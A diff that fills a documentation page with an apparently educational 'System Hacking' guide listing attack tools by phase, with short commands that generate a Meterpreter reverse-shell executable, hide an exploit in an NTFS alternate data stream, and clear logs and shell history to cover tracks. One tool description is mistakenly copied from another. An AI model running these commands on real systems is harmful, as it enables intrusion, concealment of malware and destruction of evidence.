@@ -1,11 +1,241 @@
 ---
-title: "Module 06: System Hacking"
-description: TBD
+title: System Hacking
+description: System Hacking
 slug: guide/system
 ---
 
-Ipsa illo quod rerum sed ut voluptas. 
+import { LinkCard } from "@astrojs/starlight/components";
 
-Quidem voluptatem eos ut aliquam odio quis vel. 
+System hacking is the process of gaining unauthorized access to a target's systems and applications.
 
-Architecto ab expedita accusantium est mollitia alias. Qui quaerat iusto optio facilis omnis ea.
+## Gaining access
+
+Gaining access is the process of exploiting vulnerabilities in a target's systems and applications to gain unauthorized access.
+
+<LinkCard
+  title="Responder"
+  description="Responder is a tool used to capture NTLMv1 and NTLMv2 hashes from Windows systems."
+  href="https://github.com/lgandx/Responder"
+  target="_blank"
+/>
+
+<LinkCard
+  title="L0pthCrack"
+  description="L0pthCrack is a password auditing and recovery tool."
+  href="https://l0phtcrack.gitlab.io/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Armitage"
+  description="Armitage is a graphical cyber attack management tool for Metasploit."
+  href="https://www.fastandeasyhacking.com/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Ninja Jonin"
+  description="A general-purpose fully customizable software to control a remote computer behind any NAT, Firewall and proxy."
+  href="https://github.com/ErAz7/Ninja"
+  target="_blank"
+/>
+
+<LinkCard
+  title="ImmunityDebugger"
+  description="Immunity Debugger is a powerful way to write exploits, analyze malware, and reverse engineer binary files."
+  href="https://github.com/kbandla/ImmunityDebugger"
+  target="_blank"
+/>
+
+## Metasploit
+
+Metasploit is a penetration testing framework that allows security professionals to find and exploit vulnerabilities in systems and applications.
+
+```bash
+# Generate a reverse tcp payload for Windows
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows \
+    -a x86 -o file.exe LHOST=YOUR_IP LPORT=YOUR_PORT
+```
+
+<LinkCard
+  title="Metasploit"
+  description="Metasploit is a penetration testing framework."
+  href="https://www.metasploit.com/"
+  target="_blank"
+/>
+
+## Exploit sites
+
+Exploit sites are repositories of information about known vulnerabilities in software and hardware.
+
+<LinkCard title="ExploitDB" href="https://www.exploit-db.com" target="_blank" />
+
+<LinkCard title="VulDB" href="https://vuldb.com/" target="_blank" />
+
+<LinkCard title="Vulners" href="https://vulners.com/" target="_blank" />
+
+<LinkCard
+  title="CIRCL CVE Search"
+  href="https://cve.circl.lu/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="CVE Details"
+  href="https://www.cvedetails.com/"
+  target="_blank"
+/>
+
+## Privilege escalation
+
+Privilege escalation is the process of gaining higher privileges on a target's system or application.
+
+<LinkCard
+  title="Metasploit"
+  description="Metasploit is a penetration testing framework."
+  href="https://www.metasploit.com/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Mimikatz"
+  description="Mimikatz is a tool for extracting plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory."
+  href="https://github.com/ParrotSec/mimikatz"
+  target="_blank"
+/>
+
+## Post-exploitation
+
+Post-exploitation is the process of maintaining access to a target's system or application after gaining unauthorized access.
+
+<LinkCard
+  title="Power Spy"
+  description="Power Spy is a tool for extracting plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory."
+  href="https://www.power-spy.com/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Spytech SpyAgent"
+  description="Spytech SpyAgent is a powerful computer monitoring software."
+  href="https://www.spytech-web.com/spyagent/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Covert TCP"
+  description="Covert TCP is a tool for creating covert channels over TCP."
+  href="https://github.com/zaheercena/Covert-TCP-IP-Protocol"
+  target="_blank"
+/>
+
+### NTFS Alternate Data Streams
+
+NTFS streams are a feature of the NTFS file system that allows files to contain multiple streams of data.
+
+This can be used to hide data within a file without altering its size or appearance.
+
+```sh
+# Create a file with an alternate data stream
+echo "This is a hidden message" > file.txt:stream
+
+# Insert a file as an alternate data stream
+type exploit.exe > file.txt:file.exe
+```
+
+### White space stenography
+
+White space stenography is the process of hiding data by using white space characters in a file.
+
+```sh
+snow -C -m "I am lying" -p "hello world" input.txt output.txt
+```
+
+<LinkCard
+  title="snow"
+  description="Text-based steganography that uses whitespace to conceal information."
+  href="https://github.com/mattkwan-zz/snow"
+  target="_blank"
+/>
+
+### Image steganography
+
+Image steganography is the process of hiding data within an image file.
+
+<LinkCard
+  title="OpenStego"
+  description="OpenStego is a free and open-source software for image steganography."
+  href="https://github.com/syvaidya/openstego"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Stegonline"
+  description="Stegonline is a web-based tool for image steganography."
+  href="https://stegonline.georgeom.net/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="QuickStego"
+  description="QuickStego is a free and easy-to-use software for image steganography."
+  href="http://www.quickcrypto.com/free-steganography-software.html"
+  target="_blank"
+/>
+
+## Clear logs and data
+
+Clear logs is the process of deleting or modifying logs on a target's system or application to cover tracks.
+
+<LinkCard
+  title="DBAN"
+  description="Darik's Boot and Nuke is a free data destruction program."
+  href="https://dban.org/"
+  target="_blank"
+/>
+
+<LinkCard
+  title="CCleaner"
+  description="CCleaner is a utility program used to clean potentially unwanted files and invalid Windows Registry entries from a computer."
+  href="https://www.ccleaner.com/"
+  target="_blank"
+/>
+
+### Windows
+
+```sh
+# Clear logs using auditpol
+# https://learn.microsoft.com/it-it/windows-server/administration/windows-commands/auditpol
+auditpol /clear /y
+
+# Clear logs using wevtutil
+# https://learn.microsoft.com/it-it/windows-server/administration/windows-commands/wevtutil
+wevtutil cl System
+wevtutil cl Application
+# ...
+
+# Encrypt deleted data using cipher
+# https://learn.microsoft.com/it-it/windows-server/administration/windows-commands/cipher
+cipher /w:C:
+```
+
+<LinkCard
+  title="Clear Event Viewer Logs"
+  description="Clear Event Viewer Logs is a tool for clearing event logs on Windows systems."
+  href="https://gist.github.com/amnweb/0ddb3fdb7ec5da0f0c39f0e9aa9fdd56"
+  target="_blank"
+/>
+
+### Linux
+
+```sh
+# Disable bash history
+export HISTSIZE=0
+
+# Clear bash history
+history -c # all
+history -w # current session
+
+# Shred a file making it unrecoverable
+shred file.txt
+```
